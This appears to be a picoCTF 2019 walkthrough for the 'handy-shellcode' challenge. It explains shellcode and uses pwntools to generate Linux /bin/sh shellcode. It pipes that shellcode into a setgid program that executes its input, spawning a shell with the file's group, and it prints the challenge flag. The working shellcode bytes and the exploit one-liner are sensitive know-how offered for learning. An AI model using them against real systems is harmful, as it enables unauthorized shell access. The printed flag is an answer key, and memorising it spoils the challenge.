# handy-shellcode
50 points

### Description
*"This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb on the shell server. Source."*

### Solution
Here's a look at the source code provided:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```

This one is actually pretty simple in execution, but we'll need to introduce a few new concepts to understand everything that is going on. We see that the program prompts the user for input, then creates a function pointer for that input and tries to execute it. If we give the program input that isn't executable, the program will run into a segmentation fault.

If we take a look at the directory that this program is in on the server, we see the flag file, but we don't have permission to read it.
```
$ cd /problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb
$ ls
flag.txt  vuln  vuln.c
$ cat flag.txt 
cat: flag.txt: Permission denied
```
However, if we take a look at the permissions for the files in this directory, we can see that `flag.txt` is in the same permissions group as `vuln`. 
```
$ ls -l
total 656
-r--r----- 1 hacksports handy-shellcode_6     39 Sep 28  2019 flag.txt
-rwxr-sr-x 1 hacksports handy-shellcode_6 661832 Sep 28  2019 vuln
-rw-rw-r-- 1 hacksports hacksports           624 Sep 28  2019 vuln.c
```

If you aren't familiar with how file permissions work in UNIX filesystems, you can learn more about it [here](https://www.tutorialspoint.com/unix/unix-file-permission.htm).

So, we should take a hint from the problem. It asks if we can spawn a shell through the program to read `flag.txt`. Well, this is exactly what we are going to do.

First, we need to talk about **shellcode**. If you aren't familiar with the concept, a piece of shellcode is typically a malicious portion of code that a hacker wants to use as the [payload](https://en.wikipedia.org/wiki/Payload_(computing)) in exploiting a vulnerability.

In simple terms, when a C program is compiled, it is translated into binary machine code that the computer can actually understand. However, there is an intermediary step where the C source code is translated by the compiler into [assembly code](https://en.wikipedia.org/wiki/Assembly_language), which is then translated by an *assembler* into executable machine code.

We can actually write assembly ourselves that can be translated into hexadecimal, which will make it a valid, executable piece of code. This is the process by which shellcode is usually created. You can find a great introduction to shellcode [here](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf) if you want to learn more about it.

As hackers, this problem makes our job **very** easy. Usually, we have to find creative ways to execute our payloads, but this program will do it for us! All we have to do is find the right shellcode.

There are a lot of great shellcode databases online, but I think the best is [shell-storm](http://shell-storm.org/shellcode/).

However, if you've checked out any of my other picoCTF walkthroughs, you may have learned that I like to do stuff with python when I can. For this problem, we're going to use one of the most useful python modules available to hackers: [pwntools](http://docs.pwntools.com/en/stable/).

The `pwn.shellcraft` module has a lot of useful code for generating shellcode, and it can be used to generate shellcode for many different operating systems and architectures.
```python
from pwn import shellcraft

print(shellcraft.linux.sh())
```

The code above will print out the actual *assembly* instructions for generating a shell on a linux operating system. Remember, we don't want assembly code, but rather *shellcode*.

We can use `pwn.asm` to convert assembly instructions to machine code:
```python
from pwn import shellcraft, asm

print(asm(shellcraft.linux.sh()))
```

Here's something like what you should've gotten.
<details>
  <summary>Shellcode:</summary>
  b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
</details>

If your output had a lot of random characters that don't look like this, don't worry, that just means python is printing out the actual bytes rather than the hex values. This is just dependent on your Python version. 

Speaking of Python version, you'll actually want to use Python2 for this because we want the actual bytes to be printed out and not the hex values. The reason the output is different between versions is because of a difference in how byte strings are handled and encoded in Python2 vs Python3. Just know that Python2 is typically preferred when trying to generate shellcode like this.

Using Python2 (which you may have been using before), your shellcode should look like this.
<details>
  <summary>Shellcode:</summary>
  jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
</details>

We now want this shellcode to be fed in as the input to `vuln`. If we are in the directory with `vuln` and `flag.txt` on the server, we can execute the python code above in one command using the python `-c` flag. We can then pipe this into `vuln`.
```
$ python2 -c "from pwn import asm, shellcraft; print(asm(shellcraft.linux.sh()))" | ./vuln
```

However, you'll notice that you can't actually use the shell that spawns, you're immediately brought back to your normal command-line prompt. This is a common issue we run into in situations like this. What's happening is that python gives the input to `vuln`, then python stops executing. This is bad because all of the input to `vuln` is going through python. So, when python stops executing, `vuln` stops trying to get input, even if the shell is spawned.

This is easy to fix. We just need to append another command that executes *after* the python command, but prompts for input. This will give us an input stream to be able to interact will the shell that we spawned.

The best command for this is `cat`, since when it is used with no arguments, it just waits for user input and then repeats it as output.
```
$ (python2 -c "from pwn import asm, shellcraft; print(asm(shellcraft.linux.sh()))"; cat) | ./vuln
```

While you can't see the prompt, we are now in the shell that we spawned. We can use `id` to see that we now have the same group permissions as `flag.txt`. So, we can finally read it.
```
$ (python2 -c "from pwn import asm, shellcraft; print(asm(shellcraft.linux.sh()))"; cat) | ./vuln 
Enter your shellcode:
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...
id
uid=49513(flow2) gid=8875(handy-shellcode_6) groups=8875(handy-shellcode_6),1002(competitors),49514(flow2)
ls
flag.txt  vuln	vuln.c
cat flag.txt
```
**NOTE:** This won't work if you use Python3 because Python will pass `vuln` the hex values of the shellcode rather than the actual bytes. Make sure you run this using Python2.

And this should get you the flag!

<details>
  <summary>Flag:</summary>
  picoCTF{h4ndY_d4ndY_sh311c0d3_15d47ccd}
</details>

[Next Problem]()

[Return to Binary Exploitation](https://github.com/sdvickers98/picoCTF-2019-Walkthrough/blob/master/binary_exploitation/%230%20-%20Binary%20Exploitation%20Homepage.md)

[Return to Homepage](https://github.com/sdvickers98/picoCTF-2019-Walkthrough)
